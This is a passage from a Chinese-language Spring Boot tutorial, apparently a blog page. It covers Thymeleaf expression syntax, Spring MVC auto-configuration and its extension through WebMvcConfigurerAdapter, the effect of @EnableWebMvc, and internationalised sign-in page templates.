th:text=&quot;*&#123;lastName&#125;&quot;&gt;Pepper&lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Nationality: &lt;span th:text=&quot;*&#123;nationality&#125;&quot;&gt;Saturn&lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    </span><br><span class="line">    Message Expressions: #&#123;...&#125;：获取国际化内容</span><br><span class="line">    Link URL Expressions: @&#123;...&#125;：定义URL；</span><br><span class="line">    @&#123;/order/process(execId=$&#123;execId&#125;,execType=&apos;FAST&apos;)&#125;</span><br><span class="line">    Fragment Expressions: ~&#123;...&#125;：片段引用表达式</span><br><span class="line">    &lt;div th:insert=&quot;~&#123;commons :: main&#125;&quot;&gt;...&lt;/div&gt;</span><br><span class="line">    </span><br><span class="line">Literals（字面量）</span><br><span class="line">      Text literals: &apos;one text&apos; , &apos;Another one!&apos; ,…</span><br><span class="line">      Number literals: 0 , 34 , 3.0 , 12.3 ,…</span><br><span class="line">      Boolean literals: true , false</span><br><span class="line">      Null literal: null</span><br><span class="line">      Literal tokens: one , sometext , main ,…</span><br><span class="line">Text operations:（文本操作）</span><br><span class="line">    String concatenation: +</span><br><span class="line">    Literal substitutions: |The name is $&#123;name&#125;|</span><br><span class="line">Arithmetic operations:（数学运算）</span><br><span class="line">    Binary operators: + , - , * , / , %</span><br><span class="line">    Minus sign (unary operator): -</span><br><span class="line">Boolean operations:（布尔运算）</span><br><span class="line">    Binary operators: and , or</span><br><span class="line">    Boolean negation (unary operator): ! , not</span><br><span class="line">Comparisons and equality:（比较运算）</span><br><span class="line">    Comparators: &gt; , &lt; , &gt;= , &lt;= ( gt , lt , ge , le )</span><br><span class="line">    Equality operators: == , != ( eq , ne )</span><br><span class="line">Conditional operators:条件运算（三元运算符）</span><br><span class="line">    If-then: (if) ? (then)</span><br><span class="line">    If-then-else: (if) ? (then) : (else)</span><br><span class="line">    Default: (value) ?: (defaultvalue)</span><br><span class="line">Special tokens:</span><br><span class="line">    No-Operation: _</span><br></pre></td></tr></table></figure><h2 id="4、SpringMVC自动配置"><a href="#4、SpringMVC自动配置" class="headerlink" title="4、SpringMVC自动配置"></a>4、SpringMVC自动配置</h2><p><a href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#boot-features-developing-web-applications" target="_blank" rel="noopener">https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#boot-features-developing-web-applications</a></p><h3 id="1-Spring-MVC-auto-configuration"><a href="#1-Spring-MVC-auto-configuration" class="headerlink" title="1. Spring MVC auto-configuration"></a>1. Spring MVC auto-configuration</h3><p>Spring Boot 自动配置好了SpringMVC</p><p>以下是SpringBoot对SpringMVC的默认配置:<strong>==（WebMvcAutoConfiguration）==</strong></p><ul><li><p>Inclusion of <code>ContentNegotiatingViewResolver</code> and <code>BeanNameViewResolver</code> beans.</p><ul><li>自动配置了ViewResolver（视图解析器：根据方法的返回值得到视图对象（View），视图对象决定如何渲染（转发？重定向？））</li><li>ContentNegotiatingViewResolver：组合所有的视图解析器的；</li><li>==如何定制：我们可以自己给容器中添加一个视图解析器；自动的将其组合进来；==</li></ul></li><li><p>Support for serving static resources, including support for WebJars (see below).静态资源文件夹路径,webjars</p></li><li><p>Static <code>index.html</code> support. 静态首页访问</p></li><li><p>Custom <code>Favicon</code> support (see below).  favicon.ico</p><p>​</p></li><li><p>自动注册了 of <code>Converter</code>, <code>GenericConverter</code>, <code>Formatter</code> beans.</p><ul><li>Converter：转换器；  public String hello(User user)：类型转换使用Converter</li><li><code>Formatter</code>  格式化器；  2017.12.17===Date；</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty</span>(prefix = <span class="string">"spring.mvc"</span>, name = <span class="string">"date-format"</span>)<span class="comment">//在文件中配置日期格式化的规则</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Formatter&lt;Date&gt; <span class="title">dateFormatter</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> DateFormatter(<span class="keyword">this</span>.mvcProperties.getDateFormat());<span class="comment">//日期格式化组件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    ==自己添加的格式化器转换器，我们只需要放在容器中即可==</p><ul><li><p>Support for <code>HttpMessageConverters</code> (see below).</p><ul><li><p>HttpMessageConverter：SpringMVC用来转换Http请求和响应的；User—-Json；</p></li><li><p><code>HttpMessageConverters</code> 是从容器中确定；获取所有的HttpMessageConverter；</p><p>==自己给容器中添加HttpMessageConverter，只需要将自己的组件注册容器中（@Bean,@Component）==</p><p>​</p></li></ul></li><li><p>Automatic registration of <code>MessageCodesResolver</code> (see below).定义错误代码生成规则</p></li><li><p>Automatic use of a <code>ConfigurableWebBindingInitializer</code> bean (see below).</p><p>==我们可以配置一个ConfigurableWebBindingInitializer来替换默认的；（添加到容器）==</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始化WebDataBinder；</span><br><span class="line">请求数据<span class="comment">=====JavaBean；</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>org.springframework.boot.autoconfigure.web：web的所有自动场景；</strong></p><p>If you want to keep Spring Boot MVC features, and you just want to add additional <a href="https://docs.spring.io/spring/docs/4.3.14.RELEASE/spring-framework-reference/htmlsingle#mvc" target="_blank" rel="noopener">MVC configuration</a> (interceptors, formatters, view controllers etc.) you can add your own <code>@Configuration</code> class of type <code>WebMvcConfigurerAdapter</code>, but <strong>without</strong> <code>@EnableWebMvc</code>. If you wish to provide custom instances of <code>RequestMappingHandlerMapping</code>, <code>RequestMappingHandlerAdapter</code> or <code>ExceptionHandlerExceptionResolver</code> you can declare a <code>WebMvcRegistrationsAdapter</code> instance providing such components.</p><p>If you want to take complete control of Spring MVC, you can add your own <code>@Configuration</code> annotated with <code>@EnableWebMvc</code>.</p><h3 id="2、扩展SpringMVC"><a href="#2、扩展SpringMVC" class="headerlink" title="2、扩展SpringMVC"></a>2、扩展SpringMVC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:view-controller</span> <span class="attr">path</span>=<span class="string">"/hello"</span> <span class="attr">view-name</span>=<span class="string">"success"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">"/hello"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>==编写一个配置类（@Configuration），是WebMvcConfigurerAdapter类型；不能标注@EnableWebMvc==</strong>;</p><p>既保留了所有的自动配置，也能用我们扩展的配置；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//浏览器发送 /atguigu 请求来到 success</span></span><br><span class="line">        registry.addViewController(<span class="string">"/atguigu"</span>).setViewName(<span class="string">"success"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理：</p><p>​    1）、WebMvcAutoConfiguration是SpringMVC的自动配置类</p><p>​    2）、在做其他自动配置时会导入；@Import(<strong>EnableWebMvcConfiguration</strong>.class)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EnableWebMvcConfiguration</span> <span class="keyword">extends</span> <span class="title">DelegatingWebMvcConfiguration</span> </span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> WebMvcConfigurerComposite configurers = <span class="keyword">new</span> WebMvcConfigurerComposite();</span><br><span class="line"></span><br><span class="line"> <span class="comment">//从容器中获取所有的WebMvcConfigurer</span></span><br><span class="line">     <span class="meta">@Autowired</span>(required = <span class="keyword">false</span>)</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setConfigurers</span><span class="params">(List&lt;WebMvcConfigurer&gt; configurers)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (!CollectionUtils.isEmpty(configurers)) &#123;</span><br><span class="line">             <span class="keyword">this</span>.configurers.addWebMvcConfigurers(configurers);</span><br><span class="line">           <span class="comment">//一个参考实现；将所有的WebMvcConfigurer相关配置都来一起调用；  </span></span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">            <span class="comment">// public void addViewControllers(ViewControllerRegistry registry) &#123;</span></span><br><span class="line">             <span class="comment">//    for (WebMvcConfigurer delegate : this.delegates) &#123;</span></span><br><span class="line">              <span class="comment">//       delegate.addViewControllers(registry);</span></span><br><span class="line">              <span class="comment">//   &#125;</span></span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3）、容器中所有的WebMvcConfigurer都会一起起作用；</p><p>​    4）、我们的配置类也会被调用；</p><p>​    效果：SpringMVC的自动配置和我们的扩展配置都会起作用；</p><h3 id="3、全面接管SpringMVC；"><a href="#3、全面接管SpringMVC；" class="headerlink" title="3、全面接管SpringMVC；"></a>3、全面接管SpringMVC；</h3><p>SpringBoot对SpringMVC的自动配置不需要了，所有都是我们自己配置；所有的SpringMVC的自动配置都失效了</p><p><strong>我们需要在配置类中添加@EnableWebMvc即可；</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//浏览器发送 /atguigu 请求来到 success</span></span><br><span class="line">        registry.addViewController(<span class="string">"/atguigu"</span>).setViewName(<span class="string">"success"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理：</p><p>为什么@EnableWebMvc自动配置就失效了；</p><p>1）@EnableWebMvc的核心</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Import</span>(DelegatingWebMvcConfiguration.class)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableWebMvc &#123;</span><br></pre></td></tr></table></figure><p>2）、</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DelegatingWebMvcConfiguration</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurationSupport</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>3）、</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span></span><br><span class="line"><span class="meta">@ConditionalOnClass</span>(&#123; Servlet.class, DispatcherServlet.class,</span><br><span class="line">WebMvcConfigurerAdapter.class &#125;)</span><br><span class="line"><span class="comment">//容器中没有这个组件的时候，这个自动配置类才生效</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span>(WebMvcConfigurationSupport.class)</span><br><span class="line"><span class="meta">@AutoConfigureOrder</span>(Ordered.HIGHEST_PRECEDENCE + <span class="number">10</span>)</span><br><span class="line"><span class="meta">@AutoConfigureAfter</span>(&#123; DispatcherServletAutoConfiguration.class,</span><br><span class="line">ValidationAutoConfiguration.class &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebMvcAutoConfiguration</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>4）、@EnableWebMvc将WebMvcConfigurationSupport组件导入进来；</p><p>5）、导入的WebMvcConfigurationSupport只是SpringMVC最基本的功能；</p><h2 id="5、如何修改SpringBoot的默认配置"><a href="#5、如何修改SpringBoot的默认配置" class="headerlink" title="5、如何修改SpringBoot的默认配置"></a>5、如何修改SpringBoot的默认配置</h2><p>模式：</p><p>​    1）、SpringBoot在自动配置很多组件的时候，先看容器中有没有用户自己配置的（@Bean、@Component）如果有就用用户配置的，如果没有，才自动配置；如果有些组件可以有多个（ViewResolver）将用户配置的和自己默认的组合起来；</p><p>​    2）、在SpringBoot中会有非常多的xxxConfigurer帮助我们进行扩展配置</p><p>​    3）、在SpringBoot中会有很多的xxxCustomizer帮助我们进行定制配置</p><h2 id="6、RestfulCRUD"><a href="#6、RestfulCRUD" class="headerlink" title="6、RestfulCRUD"></a>6、RestfulCRUD</h2><h3 id="1）、默认访问首页"><a href="#1）、默认访问首页" class="headerlink" title="1）、默认访问首页"></a>1）、默认访问首页</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能</span></span><br><span class="line"><span class="comment">//@EnableWebMvc   不要接管SpringMVC</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//浏览器发送 /atguigu 请求来到 success</span></span><br><span class="line">        registry.addViewController(<span class="string">"/atguigu"</span>).setViewName(<span class="string">"success"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//所有的WebMvcConfigurerAdapter组件都会一起起作用</span></span><br><span class="line">    <span class="meta">@Bean</span> <span class="comment">//将组件注册在容器</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> WebMvcConfigurerAdapter <span class="title">webMvcConfigurerAdapter</span><span class="params">()</span></span>&#123;</span><br><span class="line">        WebMvcConfigurerAdapter adapter = <span class="keyword">new</span> WebMvcConfigurerAdapter() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">                registry.addViewController(<span class="string">"/"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">                registry.addViewController(<span class="string">"/index.html"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> adapter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2）、国际化"><a href="#2）、国际化" class="headerlink" title="2）、国际化"></a>2）、国际化</h3><p><strong>1）、编写国际化配置文件；</strong></p><p>2）、使用ResourceBundleMessageSource管理国际化资源文件</p><p>3）、在页面使用fmt:message取出国际化内容</p><p>步骤：</p><p>1）、编写国际化配置文件，抽取页面需要显示的国际化消息</p><p><img src="images/搜狗截图20180211130721.png" alt=""></p><p>2）、SpringBoot自动配置好了管理国际化资源文件的组件；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.messages"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MessageSourceAutoConfiguration</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Comma-separated list of basenames (essentially a fully-qualified classpath</span></span><br><span class="line"><span class="comment"> * location), each following the ResourceBundle convention with relaxed support for</span></span><br><span class="line"><span class="comment"> * slash based locations. If it doesn't contain a package qualifier (such as</span></span><br><span class="line"><span class="comment"> * "org.mypackage"), it will be resolved from the classpath root.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> String basename = <span class="string">"messages"</span>;  </span><br><span class="line">    <span class="comment">//我们的配置文件可以直接放在类路径下叫messages.properties；</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> MessageSource <span class="title">messageSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ResourceBundleMessageSource messageSource = <span class="keyword">new</span> ResourceBundleMessageSource();</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.basename)) &#123;</span><br><span class="line">            <span class="comment">//设置国际化资源文件的基础名（去掉语言国家代码的）</span></span><br><span class="line">messageSource.setBasenames(StringUtils.commaDelimitedListToStringArray(</span><br><span class="line">StringUtils.trimAllWhitespace(<span class="keyword">this</span>.basename)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.encoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">messageSource.setDefaultEncoding(<span class="keyword">this</span>.encoding.name());</span><br><span class="line">&#125;</span><br><span class="line">messageSource.setFallbackToSystemLocale(<span class="keyword">this</span>.fallbackToSystemLocale);</span><br><span class="line">messageSource.setCacheSeconds(<span class="keyword">this</span>.cacheSeconds);</span><br><span class="line">messageSource.setAlwaysUseMessageFormat(<span class="keyword">this</span>.alwaysUseMessageFormat);</span><br><span class="line"><span class="keyword">return</span> messageSource;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）、去页面获取国际化的值；</p><p><img src="images/搜狗截图20180211134506.png" alt=""></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>  <span class="attr">xmlns:th</span>=<span class="string">"http://www.thymeleaf.org"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Signin Template for Bootstrap<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"asserts/css/bootstrap.min.css"</span> <span class="attr">th:href</span>=<span class="string">"@&#123;/webjars/bootstrap/4.0.0/css/bootstrap.css&#125;"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"asserts/css/signin.css"</span> <span class="attr">th:href</span>=<span class="string">"@&#123;/asserts/css/signin.css&#125;"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-signin"</span> <span class="attr">action</span>=<span class="string">"dashboard.html"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"mb-4"</span> <span class="attr">th:src</span>=<span class="string">"@&#123;/asserts/img/bootstrap-solid.svg&#125;"</span> <span class="attr">src</span>=<span class="string">"asserts/img/bootstrap-solid.svg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"72"</span> <span class="attr">height</span>=<span class="string">"72"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"h3 mb-3 font-weight-normal"</span> <span class="attr">th:text</span>=<span class="string">"#&#123;login.tip&#125;"</span>&gt;</span>Please sign in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"sr-only"</span> <span class="attr">th:text</span>=<span class="string">"#&#123;login.username&#125;"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span> <span class="attr">th:placeholder</span>=<span class="string">"#&#123;login.username&#125;"</span> <span class="attr">required</span>=<span class="string">""</span> <span class="attr">autofocus</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"sr-only"</span> <span class="attr">th:text</span>=<span class="string">"#&#123;login.password&#125;"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span> <span class="attr">th:placeholder</span>=<span class="string">"#&#123;login.password&#125;"</span> <span class="attr">required</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"checkbox mb-3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">value</span>=<span class="string">"remember-me"</span>/&gt;</span> [[#&#123;login.remember&#125;]]</span><br><span class="line">        <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-primary btn-block"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">th:text</span>=<span class="string">"#&#123;login.btn&#125;"</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"mt-5 mb-3 text-muted"</span>&gt;</span>© 2017-2018<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-sm"</span>&gt;</span>中文<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-sm"</span>&gt;</span>English<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果：根据浏览器语言设置的信息切换了国际化；</p><p>原理：</p><p>​    国际化Locale（区域信息对象）；LocaleResolver（获取区域信息对象）；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 